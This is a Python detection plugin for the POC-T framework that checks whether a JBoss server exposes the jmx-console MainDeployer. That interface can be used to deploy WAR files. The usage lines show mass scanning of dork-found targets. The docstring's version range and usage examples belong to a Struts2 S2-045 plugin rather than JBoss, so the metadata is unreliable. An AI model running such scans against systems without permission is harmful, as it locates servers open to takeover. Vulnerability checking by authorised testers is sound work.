#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = 24''

"""
Jboss 中间件 上传WAR包漏洞

Version:
2.3.5-2.3.31, 2.5-2.5.10

Usage:
python POC-T.py -s struts2-s2045 -aG "inurl:login.action" --gproxy "http 127.0.0.1 1080"
python POC-T.py -s struts2-s2045 -aZ "login.action"
python POC-T.py -s struts2-s2045 -iF FILE.txt
"""

import requests
import random


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        s=requests.get(url)
        if "/jmx-console/" in s.text:      
            r = requests.get(url+'/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Aservice%3DMainDeployer',timeout=15)       
            if r.status_code==200 and "void deploy()" in r.text:               
                return '[jboss vulb]: ' + url+"/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Aservice%3DMainDeployer"
            else:
                return False
    except Exception:
        return False
